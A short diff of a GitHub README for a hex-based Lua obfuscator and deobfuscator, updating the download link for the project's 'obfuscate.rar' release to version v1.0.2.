@@ -1,4 +1,4 @@
-To download, go to the releases on the right or follow the link - https://github.com/Hilka-dilka/obfuscate.lua/releases/download/lua/obfuscate.rar
+To download, go to the releases on the right or follow the link - [obfuscate.rar](https://github.com/Hilka-dilka/obfuscate.lua/releases/download/v1.0.2/obfuscate.rar)
 
 # **Alargon's Lua Obfuscator & Deobfuscator (Hex-Based)**
 
